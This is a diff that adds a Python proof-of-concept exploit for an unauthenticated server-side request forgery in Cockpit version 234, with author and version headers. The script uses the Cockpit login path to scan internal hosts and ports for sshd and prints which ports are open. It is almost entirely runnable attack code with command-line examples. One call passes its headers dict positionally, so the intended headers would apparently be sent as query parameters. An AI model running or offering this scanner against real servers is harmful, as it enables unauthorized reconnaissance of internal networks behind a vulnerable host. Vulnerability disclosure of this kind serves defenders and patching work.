@@ -1,0 +1,88 @@
+# Exploit Title: Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)
+# Date: 08.01.2021
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://cockpit-project.org/
+# Version: v234
+# Tested on: Ubuntu 18.04
+
+#!/usr/bin/python3
+import argparse
+import requests
+import sys
+import urllib3
+import time
+from colorama import Fore, Style
+from argparse import ArgumentParser, Namespace
+from bs4 import BeautifulSoup
+
+"""
+Example scanning for internal server:
+python3 PoC.py --target 192.168.1.33:9090 --scan 172.16.16.16 --ports 21,22,23
+Example scanning for loopback interface of server: 
+python3 PoC.py --target 192.168.1.33:9090 
+Description : https://github.com/passtheticket/vulnerability-research/tree/main/cockpitProject/README.md
+"""
+    
+def main():
+    dsc = "Cockpit Version 234 - sshd Service Scanning via Server-Side Request Forgery (Unauthenticated)"
+    parser: ArgumentParser = argparse.ArgumentParser(description=dsc)
+    parser.add_argument("--target", help="IP address of Cockpit server", type=str, required=True)
+    parser.add_argument("--scan", help="IP address of server that will be scanned", type=str, required=False)
+    parser.add_argument("--ports", help="Ports (example: 21,22)", type=str, required=False)
+    args: Namespace = parser.parse_args()
+
+    if args.target:
+        target = args.target
+        if args.scan:
+            scan = args.scan
+            if args.ports:
+                ports = args.ports
+            else:
+                ports = "22"
+        else:
+            scan = "127.0.0.1"
+            if args.ports:
+                ports = args.ports
+            else:
+                ports = "22"
+        cockpitReq(target, scan, ports)
+
+def cockpitReq(target, scan, ports):
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    portRange = ports.split(",")
+    for unsafe in portRange:
+        headers = {
+            "Host": str(target),
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate",
+            "Authorization": "Basic dW5zYWZlOmlubGluZQ==",
+            "X-Authorize": "",
+            "Connection": "close",
+            "Cookie": "cockpit=deleted",
+        }
+        req = requests.get("http://" + target + "/cockpit+=" + scan + ":" + unsafe + "/login", headers, verify=False)
+        time.sleep(2)
+        soup = BeautifulSoup(req.text, 'html.parser')
+        responseCode = req.status_code
+        responseTime = str(req.elapsed)
+
+        if responseCode == 404:
+            print("Cockpit server was not found!")
+        elif responseCode == 401:
+            if soup.title.string == "Authentication failed":
+                print(Fore.GREEN + Style.BRIGHT + "[+] Port: "+ unsafe + " sshd service is detected!")
+            elif soup.title.string == "Authentication failed: no-host":
+                if responseTime > "0:00:10.000000":
+                	print(Fore.GREEN + Style.BRIGHT +"[-] Port: "+ unsafe + " is open, sshd service is not detected!")
+                else:
+                	print(Fore.RED + Style.BRIGHT +"[-] Port: "+ unsafe + " sshd service is not detected!")
+            else:
+                print(Fore.RED + Style.BRIGHT +"[-] Error is occured!")
+                print("[-] One bad day!")
+                sys.exit(1)
+        else:
+            print("Something went wrong!")
+
+main()
